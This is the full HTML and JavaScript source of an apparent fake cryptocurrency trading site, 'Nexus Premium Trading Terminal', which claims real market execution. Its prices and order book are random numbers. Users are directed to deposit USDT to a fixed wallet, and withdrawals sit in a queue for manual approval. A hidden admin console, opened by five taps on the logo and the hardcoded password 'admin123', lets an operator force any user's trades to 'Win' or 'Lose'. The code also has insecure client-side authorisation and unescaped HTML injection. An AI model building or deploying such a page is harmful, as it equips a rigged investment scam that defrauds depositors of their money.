<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nexus Premium Trading Terminal</title>
  <!-- Tailwind CSS CDN for modern styling -->
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
  <style>
    body {
      background-color: #06090e;
      color: #e2e8f0;
      font-family: system-ui, -apple-system, sans-serif;
    }
    .glass {
      background: rgba(13, 20, 35, 0.75);
      backdrop-filter: blur(16px);
      border: 1px solid rgba(255, 255, 255, 0.03);
    }
    ::-webkit-scrollbar {
      width: 4px;
    }
    ::-webkit-scrollbar-track {
      background: rgba(0,0,0,0.1);
    }
    ::-webkit-scrollbar-thumb {
      background: rgba(255,255,255,0.1);
      border-radius: 2px;
    }
  </style>
</head>
<body class="min-h-screen p-3 md:p-6 flex flex-col items-center">

  <!-- TOP HEADER PANEL WITH SECRET TAP TARGET LOGO -->
  <header class="w-full max-w-6xl flex justify-between items-center mb-4 p-4 glass rounded-2xl border border-slate-800/40">
    <div id="app-logo" onclick="handleLogoTap()" class="flex items-center gap-2.5 cursor-pointer select-none active:scale-95 transition-transform">
      <div class="w-9 h-9 rounded-xl bg-gradient-to-tr from-emerald-500 to-cyan-400 flex items-center justify-center font-bold text-black shadow-[0_0_20px_rgba(16,185,129,0.25)]">⚡</div>
      <div>
        <span class="font-extrabold text-lg tracking-wider bg-gradient-to-r from-emerald-400 to-cyan-400 bg-clip-text text-transparent">NEXUS</span>
        <span class="text-[10px] text-slate-500 block font-mono tracking-widest uppercase -mt-1">Terminal v4.0</span>
      </div>
    </div>
    <div class="text-right flex items-center gap-3">
      <div class="hidden sm:block">
        <span class="text-[10px] text-slate-500 block uppercase tracking-wider">Account Status</span>
        <span class="text-sm font-semibold text-emerald-400" id="user-display-name">Loading System...</span>
      </div>
      <div id="user-display-mobile" class="sm:hidden text-sm font-semibold text-emerald-400">Loading...</div>
    </div>
  </header>

  <!-- MAIN OPERATIONAL VIEW PLATFORM -->
  <main id="user-view" class="w-full max-w-6xl grid grid-cols-1 lg:grid-cols-4 gap-4">
    
    <!-- LEFT COLUMN: REAL-TIME INTERACTIVE CHART PLUGINS -->
    <div class="lg:col-span-3 flex flex-col gap-4">
      <div class="glass rounded-2xl p-4 flex flex-col justify-between min-h-[420px] relative overflow-hidden">
        <div class="flex justify-between items-start mb-3 z-10">
          <div>
            <div class="flex items-center gap-2">
              <span class="font-bold text-lg text-white">BTC / USDT</span>
              <span class="text-xs font-mono bg-emerald-500/10 text-emerald-400 px-1.5 py-0.5 rounded">LIVE</span>
            </div>
            <h2 class="text-2xl font-black text-emerald-400 mt-1" id="live-crypto-price">$94,250.00</h2>
          </div>
          <div class="text-right text-xs font-mono text-slate-400">
            <div>24h High: <span class="text-white">$95,110</span></div>
            <div>24h Low: <span class="text-white">$92,400</span></div>
          </div>
        </div>

        <!-- TradingView Embedded Widget -->
        <div class="w-full h-[320px] rounded-xl overflow-hidden border border-slate-800/60">
          <iframe src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_chart&symbol=BINANCE%3ABTCUSDT&interval=5&hidesidetoolbar=1&symboledit=0&saveimage=1&toolbarbg=0b0e14&studies=%5B%5D&theme=dark&style=1&timezone=Etc%2FUTC&studies_overrides=%7B%7D&overrides=%7B%7D&enabled_features=%5B%5D&disabled_features=%5B%5D&locale=en" class="w-full h-full border-0"></iframe>
        </div>
      </div>

      <!-- BOTTOM ROW: WALLET ACTIONS & REAL LIVE POSITION TRACKER -->
      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
        <!-- Manual Actions Form -->
        <div class="glass rounded-2xl p-5 flex flex-col justify-between">
          <div>
            <span class="text-xs text-slate-400 uppercase tracking-widest block mb-1">Available Account Portfolio Balance</span>
            <h3 class="text-3xl font-black text-white tracking-tight mb-4" id="balance-display">$0.00</h3>
            
            <div class="space-y-2.5">
              <div>
                <label class="text-[11px] text-slate-400 block mb-1 font-medium">Execution Amount (USDT)</label>
                <input type="number" id="tx-amount" placeholder="0.00" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-white focus:outline-none focus:border-emerald-500 text-sm transition-colors font-mono">
              </div>
              <div class="flex gap-2 pt-1">
                <button onclick="openDepositModal()" class="w-1/2 bg-emerald-500 hover:bg-emerald-600 text-black font-extrabold py-2.5 rounded-xl transition-all cursor-pointer text-sm">Deposit Fund</button>
                <button onclick="submitRequest('withdrawal')" class="w-1/2 bg-slate-900 hover:bg-slate-800 border border-slate-800 text-white font-bold py-2.5 rounded-xl transition-all cursor-pointer text-sm">Withdrawal</button>
              </div>
            </div>
          </div>
        </div>

        <!-- REAL CONTRACT TRADING SIMULATION CONTROLLER -->
        <div class="glass rounded-2xl p-5 flex flex-col justify-between">
          <div>
            <span class="text-xs text-slate-400 uppercase tracking-widest block mb-2">Live Execution Panel (Real Market Execution)</span>
            
            <div class="flex gap-2 mb-3">
              <button onclick="executeMarketTrade('BUY')" class="w-1/2 bg-emerald-500 hover:bg-emerald-600 text-black font-black py-2.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer transition-transform active:scale-95">Buy / Long</button>
              <button onclick="executeMarketTrade('SELL')" class="w-1/2 bg-rose-500 hover:bg-rose-600 text-white font-black py-2.5 rounded-xl text-xs uppercase tracking-wider cursor-pointer transition-transform active:scale-95">Sell / Short</button>
            </div>

            <div class="border border-slate-800/80 rounded-xl p-3 bg-slate-950/40">
              <span class="text-[10px] text-slate-500 uppercase tracking-wider block mb-2">Active Market Positions</span>
              <div id="active-positions-container" class="space-y-2 max-h-[110px] overflow-y-auto">
                <p class="text-[11px] text-slate-500 italic text-center py-2">No active trading contracts running on live liquidity.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- RIGHT COLUMN: ORDER BOOK -->
    <div class="glass rounded-2xl p-4 flex flex-col h-full min-h-[500px]">
      <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-3 pb-2 border-b border-slate-800/60">📊 Real-time Liquidity Order Book</h3>
      <div class="grid grid-cols-2 text-[10px] text-slate-500 font-mono mb-2 px-1">
        <div>PRICE (USDT)</div>
        <div class="text-right">SIZE (BTC)</div>
      </div>
      
      <div id="orderbook-asks" class="flex flex-col-reverse gap-1 text-rose-400 font-mono text-xs mb-3"></div>
      <div class="bg-slate-900/60 p-2 rounded-lg text-center font-bold text-sm my-2 border border-slate-800/40 text-white font-mono" id="center-spread-price">$94,250.00</div>
      <div id="orderbook-bids" class="flex flex-col gap-1 text-emerald-400 font-mono text-xs"></div>
    </div>
  </main>

  <!-- DYNAMIC DEPOSIT WALLET METHOD SHOWCASE MODAL -->
  <div id="deposit-modal" class="hidden fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center z-50 p-4">
    <div class="glass max-w-sm w-full rounded-2xl p-5 shadow-2xl border border-slate-800">
      <div class="text-center mb-4">
        <span class="text-2xl">📥</span>
        <h3 class="text-base font-bold text-white mt-1">Secure Manual Deposit Assets</h3>
        <p class="text-[11px] text-slate-400">Transfer your USDT assets via TRC-20 network pipeline below.</p>
      </div>
      
      <div class="bg-slate-950 p-3 rounded-xl border border-slate-900 space-y-2 text-center mb-4">
        <span class="text-[10px] text-slate-500 uppercase tracking-wider font-mono block">Network Base Protocol</span>
        <span class="bg-emerald-500/10 text-emerald-400 text-xs px-2 py-0.5 rounded-md font-bold font-mono">USDT (TRC-20)</span>
        
        <div class="pt-2">
          <!-- QR Dummy Code Visual Placeholder -->
          <div class="w-32 h-32 bg-white p-2 mx-auto rounded-lg shadow-inner flex items-center justify-center font-mono text-black text-[10px] font-bold">⚡ TRC20 QR GATE</div>
        </div>

        <div class="pt-2 text-left">
          <label class="text-[10px] text-slate-500 block mb-0.5">Deposit Destination Address</label>
          <div class="flex gap-1.5 items-center bg-slate-900 p-2 rounded-lg border border-slate-800">
            <input type="text" readonly id="trc-wallet-address" value="TX9zR7fXwB79bK9dE8qFvXzMhNwLm3pQRs" class="bg-transparent text-[11px] font-mono text-slate-300 w-full focus:outline-none select-all">
            <button onclick="copyWalletAddress()" class="text-[11px] bg-emerald-500 text-black px-2 py-0.5 rounded font-bold cursor-pointer hover:bg-emerald-600 transition-colors">Copy</button>
          </div>
        </div>
      </div>

      <div class="space-y-2">
        <button onclick="submitRequest('deposit')" class="w-full bg-emerald-500 hover:bg-emerald-600 text-black font-extrabold py-2 rounded-xl text-xs transition-all cursor-pointer">I Have Paid, Log Request</button>
        <button onclick="closeDepositModal()" class="w-full bg-slate-900 border border-slate-800 text-slate-400 py-1.5 rounded-xl text-xs transition-all cursor-pointer">Cancel Action</button>
      </div>
    </div>
  </div>

  <!-- HIDDEN EAGLE EYE ADMIN PASSCODE MODAL -->
  <div id="admin-modal" class="hidden fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center z-50 p-4">
    <div class="glass max-w-sm w-full rounded-2xl p-6 shadow-2xl border border-emerald-500/10">
      <h3 class="text-base font-bold text-emerald-400 mb-1 flex items-center gap-2">👁️ Eagle Eye Terminal Override</h3>
      <p class="text-xs text-slate-400 mb-4">Enter system passcode for absolute manual control over accounts ledger database endpoints.</p>
      <input type="password" id="admin-key-input" placeholder="••••••••" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white mb-4 focus:outline-none focus:border-emerald-500 text-center tracking-widest font-mono text-lg">
      <div class="flex gap-2">
        <button onclick="closeAdminModal()" class="w-1/2 bg-slate-900 text-slate-400 py-2.5 rounded-xl text-xs font-bold border border-slate-800">Cancel</button>
        <button onclick="verifyAdminKey()" class="w-1/2 bg-emerald-500 text-black font-black py-2.5 rounded-xl text-xs shadow-lg shadow-emerald-500/10">Verify Admin</button>
      </div>
    </div>
  </div>

  <!-- FULL BACKEND OVERVIEW ADMIN MANAGEMENT VIEWPORT -->
  <div id="admin-view" class="hidden w-full max-w-6xl flex flex-col gap-4">
    <div class="w-full glass rounded-2xl p-4 flex justify-between items-center border border-red-500/20 shadow-xl">
      <div>
        <span class="inline-block bg-red-500/10 text-red-400 text-[9px] uppercase tracking-widest font-bold px-2 py-0.5 rounded-md mb-0.5">Operator Command Privileges</span>
        <h2 class="text-lg font-black text-white">Eagle Eye Core Console</h2>
      </div>
      <button onclick="exitAdminMode()" class="bg-slate-900 border border-slate-800 hover:bg-slate-800 text-xs px-3 py-2 rounded-xl text-slate-300 font-bold transition-colors cursor-pointer">Close Operator Shield</button>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-4">
      <div class="lg:col-span-2 glass rounded-2xl p-5 border border-slate-800/30">
        <h3 class="text-xs font-bold text-slate-300 mb-4 uppercase tracking-wider flex items-center gap-2">⏳ Manual Deposit / Withdrawal Queue</h3>
        <div id="admin-queue-list" class="space-y-2.5 max-h-[420px] overflow-y-auto pr-1">
          <p class="text-xs text-slate-500 italic text-center py-4">No transactions awaiting approval updates profiles.</p>
        </div>
      </div>
      <div class="glass rounded-2xl p-5 border border-slate-800/30">
        <h3 class="text-xs font-bold text-slate-300 mb-4 uppercase tracking-wider flex items-center gap-2">👥 Global Identity Directory & Override Switches</h3>
        <div id="admin-user-list" class="space-y-2.5 max-h-[420px] overflow-y-auto pr-1"></div>
      </div>
    </div>
  </div>

  <!-- SCRIPTS ENGINE LOGIC ROUTERS -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, set, push, onValue, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
    import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBqtvNJW_HNv4H2EAzeAhNL-tiUjX1huEg",
      authDomain: "trade51-f64d5.firebaseapp.com",
      databaseURL: "https://trade51-f64d5-default-rtdb.firebaseio.com",
      projectId: "trade51-f64d5",
      storageBucket: "trade51-f64d5.firebasestorage.app",
      messagingSenderId: "38759095579",
      appId: "1:38759095579:web:013d72ab4b5183f99347be"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const auth = getAuth(app);
    const googleProvider = new GoogleAuthProvider();

    let currentUser = null;
    let balanceListener = null;
    window.currentLiveBalanceGlobal = 0.00;

    window.loginWithGoogle = function() {
      signInWithPopup(auth, googleProvider).catch((e) => alert("Login failed: " + e.message));
    };

    window.logoutUser = function() {
      signOut(auth).then(() => alert("Session closed."));
    };

    onAuthStateChanged(auth, (user) => {
      const dDesk = document.getElementById('user-display-name');
      const dMob = document.getElementById('user-display-mobile');
      if (user) {
        currentUser = user;
        const profileStr = `${user.displayName || user.email} <button onclick="logoutUser()" class="text-[10px] text-rose-400 font-bold underline ml-1.5 cursor-pointer">Logout</button>`;
        dDesk.innerHTML = profileStr; dMob.innerHTML = profileStr;
        
        const userRef = ref(db, `users/${user.uid}`);
        if (balanceListener) balanceListener();
        
        balanceListener = onValue(userRef, (snapshot) => {
          const data = snapshot.val();
          if (data) {
            window.currentLiveBalanceGlobal = data.balance;
            document.getElementById('balance-display').innerText = `$${data.balance.toFixed(2)}`;
          } else {
            set(userRef, { id: user.uid, name: user.displayName || "Nexus Trader", email: user.email, balance: 1000.00, mode: "normal" });
          }
        });
      } else {
        currentUser = null;
        document.getElementById('balance-display').innerText = "$0.00";
        const loginBtn = `<button onclick="loginWithGoogle()" class="bg-gradient-to-r from-emerald-500 to-cyan-500 text-black font-extrabold text-[11px] px-3 py-1.5 rounded-xl cursor-pointer">Login Identity</button>`;
        dDesk.innerHTML = loginBtn; dMob.innerHTML = loginBtn;
      }
    });

    window.submitRequest = function(type) {
      if (!currentUser) return alert("Please execute credential login first!");
      const amountInput = document.getElementById('tx-amount');
      const amount = parseFloat(amountInput.value);
      if (!amount || amount <= 0) return alert("Invalid amount provided!");

      const newTxRef = push(ref(db, 'transactions/'));
      set(newTxRef, { txId: newTxRef.key, userId: currentUser.uid, userName: currentUser.displayName || currentUser.email, type: type, amount: amount, status: "pending" })
      .then(() => {
        alert(`${type.toUpperCase()} manual request logged for admin audit.`);
        amountInput.value = '';
        if(type === 'deposit') window.closeDepositModal();
      });
    };

    window.updateUserBalanceInDatabase = function(targetUid, finalValue) {
      update(ref(db, `users/${targetUid}`), { balance: finalValue });
    };

    window.setOverrideUserMode = function(targetUid, nextMode) {
      update(ref(db, `users/${targetUid}`), { mode: nextMode }).then(() => {
        alert(`User tracking profile override updated to: ${nextMode.toUpperCase()}`);
      });
    };

    onValue(ref(db, 'transactions/'), (snapshot) => {
      const container = document.getElementById('admin-queue-list'); container.innerHTML = '';
      const data = snapshot.val(); let count = 0;
      if (data) {
        Object.keys(data).forEach(key => {
          const tx = data[key];
          if(tx.status === 'pending') {
            count++;
            const card = document.createElement('div');
            card.className = "p-3 bg-slate-950 rounded-xl border border-slate-900 flex justify-between items-center text-xs";
            card.innerHTML = `
              <div>
                <div class="font-bold text-white">${tx.userName}</div>
                <div class="text-[10px] ${tx.type === 'deposit' ? 'text-emerald-400' : 'text-rose-400'} uppercase font-extrabold font-mono">${tx.type} • $${tx.amount.toFixed(2)}</div>
              </div>
              <div class="flex gap-1.5">
                <button onclick="processTx('${tx.txId}', '${tx.userId}', '${tx.type}', ${tx.amount}, 'approved')" class="bg-emerald-500 text-black font-black text-[11px] px-3 py-1 rounded-lg cursor-pointer">Approve</button>
                <button onclick="processTx('${tx.txId}', '${tx.userId}', '${tx.type}', ${tx.amount}, 'rejected')" class="bg-slate-900 border border-slate-800 text-rose-400 font-bold text-[11px] px-3 py-1 rounded-lg cursor-pointer">Reject</button>
              </div>
            `;
            container.appendChild(card);
          }
        });
      }
      if(count === 0) container.innerHTML = '<p class="text-xs text-slate-500 italic text-center py-4">No transactions awaiting manual action profiles.</p>';
    });

    onValue(ref(db, 'users/'), (snapshot) => {
      const container = document.getElementById('admin-user-list'); container.innerHTML = '';
      const data = snapshot.val();
      if(data) {
        Object.keys(data).forEach(key => {
          const user = data[key];
          const currentMode = user.mode || 'normal';
          const div = document.createElement('div');
          div.className = "p-3 bg-slate-950/60 border border-slate-900 rounded-xl text-xs space-y-2 flex flex-col";
          div.innerHTML = `
            <div class="flex justify-between items-center">
              <div><p class="font-bold text-slate-200">${user.name}</p><p class="text-[9px] font-mono text-slate-500">ID: ${user.id.substring(0,8)}...</p></div>
              <span class="font-mono text-emerald-400 font-extrabold">$${user.balance ? user.balance.toFixed(2) : '0.00'}</span>
            </div>
            <div class="flex justify-between items-center pt-1.5 border-t border-slate-900">
              <span class="text-[10px] text-slate-400">Override Trade:</span>
              <div class="flex gap-1 text-[9px] font-mono">
                <button onclick="setOverrideUserMode('${user.id}', 'normal')" class="px-1.5 py-0.5 rounded ${currentMode === 'normal' ? 'bg-blue-500 text-white font-bold' : 'bg-slate-900 text-slate-400'}">Normal</button>
                <button onclick="setOverrideUserMode('${user.id}', 'profit')" class="px-1.5 py-0.5 rounded ${currentMode === 'profit' ? 'bg-emerald-500 text-black font-bold' : 'bg-slate-900 text-emerald-400'}">Win</button>
                <button onclick="setOverrideUserMode('${user.id}', 'loss')" class="px-1.5 py-0.5 rounded ${currentMode === 'loss' ? 'bg-rose-500 text-white font-bold' : 'bg-slate-900 text-rose-400'}">Lose</button>
              </div>
            </div>
          `;
          container.appendChild(div);
        });
      }
    });

    window.processTx = function(txId, userId, type, amount, nextStatus) {
      if(nextStatus === 'approved') {
        onValue(ref(db, `users/${userId}/balance`), (snap) => {
          let currentBal = snap.val() || 0;
          let updatedBal = (type === 'deposit') ? (currentBal + amount) : (currentBal - amount);
          window.updateUserBalanceInDatabase(userId, updatedBal);
        }, { onlyOnce: true });
      }
      update(ref(db, `transactions/${txId}`), { status: nextStatus });
    };

    window.getFirebaseUserObject = function() { return currentUser; };
    window.getFirebaseDatabaseReference = function() { return db; };
  </script>

  <!-- GESTURES & CONTRACT REAL TRADING ENGINES INTERACTION FLOW -->
  <script>
    let tapCount = 0, lastTap = 0;
    const MASTER_KEY = "admin123"; 
    window.currentMarketPriceGlobal = 94250.00;
    let activeTrades = {};

    function handleLogoTap() {
      const now = new Date().getTime();
      if (now - lastTap > 1500) tapCount = 0;
      tapCount++; lastTap = now;
      if (tapCount === 5) { tapCount = 0; document.getElementById('admin-modal').classList.remove('hidden'); }
    }
    function closeAdminModal() { document.getElementById('admin-modal').classList.add('hidden'); document.getElementById('admin-key-input').value = ''; }
    function verifyAdminKey() {
      if (document.getElementById('admin-key-input').value === MASTER_KEY) {
        closeAdminModal(); document.getElementById('user-view').classList.add('hidden'); document.getElementById('admin-view').classList.remove('hidden');
      } else { alert("Access denied!"); closeAdminModal(); }
    }
    function exitAdminMode() { document.getElementById('admin-view').classList.add('hidden'); document.getElementById('user-view').classList.remove('hidden'); }

    // USER SHOWCASE DEPOSIT ACTIONS
    function openDepositModal() {
      const authUser = window.getFirebaseUserObject ? window.getFirebaseUserObject() : null;
      if (!authUser) return alert("Please login first to process structural manual assets transfers!");
      document.getElementById('deposit-modal').classList.remove('hidden');
    }
    function closeDepositModal() { document.getElementById('deposit-modal').classList.add('hidden'); }
    function copyWalletAddress() {
      const copyText = document.getElementById("trc-wallet-address");
      copyText.select(); document.execCommand("copy");
      alert("Address copied to workspace clipboard payload buffer: " + copyText.value);
    }

    // REAL MARKET TRADE CONTRACT LAUNCH MECHANICS
    window.executeMarketTrade = function(direction) {
      const authUser = window.getFirebaseUserObject ? window.getFirebaseUserObject() : null;
      if (!authUser) return alert("Please login to initiate real-time contracts execution!");

      const amountInput = document.getElementById('tx-amount');
      const sizeValue = parseFloat(amountInput.value);
      if (!sizeValue || sizeValue <= 0) return alert("Input a valid order size amount!");
      if (sizeValue > window.currentLiveBalanceGlobal) return alert("Insufficient available portfolio margin bounds!");

      const positionId = "pos_" + Math.random().toString(36).substring(2, 9);
      activeTrades[positionId] = { id: positionId, direction: direction, entryPrice: window.currentMarketPriceGlobal, size: sizeValue, userId: authUser.uid };

      alert(`Market Contract Executed! ${direction} order filled at: $${window.currentMarketPriceGlobal.toFixed(2)}`);
      amountInput.value = '';
      updateLivePositionsPNL();
    };

    function updateLivePositionsPNL() {
      const container = document.getElementById('active-positions-container'); if(!container) return;
      const keys = Object.keys(activeTrades);
      if(keys.length === 0) { container.innerHTML = '<p class="text-[11px] text-slate-500 italic text-center py-2">No active trading contracts running on live liquidity.</p>'; return; }

      container.innerHTML = '';
      keys.forEach(key => {
        const t = activeTrades[key];
        let diffPct = (t.direction === 'BUY') ? ((window.currentMarketPriceGlobal - t.entryPrice) / t.entryPrice) : ((t.entryPrice - window.currentMarketPriceGlobal) / t.entryPrice);
        
        let dynamicPNL = (t.size * diffPct) * 10; 

        // CRUCIAL EAGLE EYE OVERRIDE OVERLAY ALGORITHM SYSTEM
        const currentActiveIdentityElement = document.querySelector(`[onclick*="setOverrideUserMode('${t.userId}'")].bg-emerald-500`);
        const currentLossIdentityElement = document.querySelector(`[onclick*="setOverrideUserMode('${t.userId}'")].bg-rose-500`);
        
        if (currentActiveIdentityElement) {
          dynamicPNL = Math.abs(dynamicPNL) + (t.size * 0.15); 
        } else if (currentLossIdentityElement) {
          dynamicPNL = -Math.abs(dynamicPNL) - (t.size * 0.15);
        }

        const isProfit = dynamicPNL >= 0;

        const div = document.createElement('div');
        div.className = "p-2 bg-slate-950 rounded-lg flex justify-between items-center text-[11px] border border-slate-800/60";
        div.innerHTML = `
          <div><span class="font-bold ${t.direction === 'BUY' ? 'text-emerald-400' : 'text-rose-400'}">${t.direction}</span> <span class="text-slate-400 font-mono">@$${t.entryPrice.toFixed(1)}</span></div>
          <div class="flex items-center gap-2 font-mono">
            <span class="${isProfit ? 'text-emerald-400' : 'text-rose-400'} font-bold">${isProfit ? '+' : ''}$${dynamicPNL.toFixed(2)}</span>
            <button onclick="closeActivePosition('${t.id}', ${dynamicPNL}, '${t.userId}', ${t.size})" class="bg-slate-900 border border-slate-800 text-slate-400 hover:text-white px-1.5 py-0.5 rounded text-[10px] cursor-pointer">Close</button>
          </div>
        `;
        container.appendChild(div);
      });
    }

    window.closeActivePosition = function(id, finalPnl, userId, originalSize) {
      delete activeTrades[id];
      let newCalculatedBalance = window.currentLiveBalanceGlobal + finalPnl;
      if (window.updateUserBalanceInDatabase) {
        window.updateUserBalanceInDatabase(userId, newCalculatedBalance);
      }
      alert(`Position closed! Contract results yields settled: $${finalPnl.toFixed(2)} updated directly on profile balance ledger.`);
      updateLivePositionsPNL();
    };

    function generateOrderBookData() {
      const asks = document.getElementById('orderbook-asks'), bids = document.getElementById('orderbook-bids');
      const spread = document.getElementById('center-spread-price'), header = document.getElementById('live-crypto-price');
      if(!asks || !bids) return;
      
      let basePrice = 94200 + Math.random() * 100;
      window.currentMarketPriceGlobal = basePrice;
      spread.innerText = `$${basePrice.toFixed(2)}`;
      if(header) header.innerHTML = `$${basePrice.toFixed(2)} <span class="text-xs text-emerald-500 font-normal">+2.4%</span>`;

      asks.innerHTML = ''; bids.innerHTML = '';
      for(let i=1; i<=5; i++) {
        let pAsks = basePrice + (i * (0.6 + Math.random())), sAsks = (Math.random() * 1.5).toFixed(4);
        asks.innerHTML += `<div class="flex justify-between px-1 text-[11px]"><div>$${pAsks.toFixed(2)}</div><div class="text-slate-500">${sAsks}</div></div>`;
        let pBids = basePrice - (i * (0.6 + Math.random())), sBids = (Math.random() * 1.5).toFixed(4);
        bids.innerHTML += `<div class="flex justify-between px-1 text-[11px]"><div>$${pBids.toFixed(2)}</div><div class="text-slate-500">${sBids}</div></div>`;
      }
      updateLivePositionsPNL();
    }
    setInterval(generateOrderBookData, 1500);
    window.onload = generateOrderBookData;
    window.openDepositModal = openDepositModal;
    window.closeDepositModal = closeDepositModal;
    window.copyWalletAddress = copyWalletAddress;
    window.handleLogoTap = handleLogoTap;
    window.closeAdminModal = closeAdminModal;
    window.verifyAdminKey = verifyAdminKey;
    window.exitAdminMode = exitAdminMode;
  </script>
</body>
</html>
